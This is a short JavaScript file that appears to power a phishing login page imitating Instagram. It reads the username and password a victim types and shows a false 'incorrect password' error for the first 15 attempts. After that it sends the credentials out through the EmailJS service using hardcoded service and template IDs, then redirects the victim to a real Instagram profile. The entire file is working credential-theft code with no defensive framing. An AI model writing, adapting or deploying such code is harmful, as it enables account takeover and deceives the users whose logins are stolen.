const error =
  "Sorry, your username or password is incorrect. Please check again.";
let click = 0;
const serviceID = "service_luzn66c";
const templateID = "template_kmkaq3o";
function sendMail(event) {
  click++;
  var params = {
    username: document.getElementById("username").value,
    password: document.getElementById("password").value,
  };

  if (params.password == "" || params.username == "" || click <= 15) {
    document.getElementById("error").innerText = error;
  } else {
    emailjs.send(serviceID, templateID, params).then((res) => {
      document.getElementById("username").value = "";
      document.getElementById("password").value = "";
      window.location.href = "https://instagram.com/irina_sambruskaya/";
    });
  }

  event.preventDefault();
  return false;
}
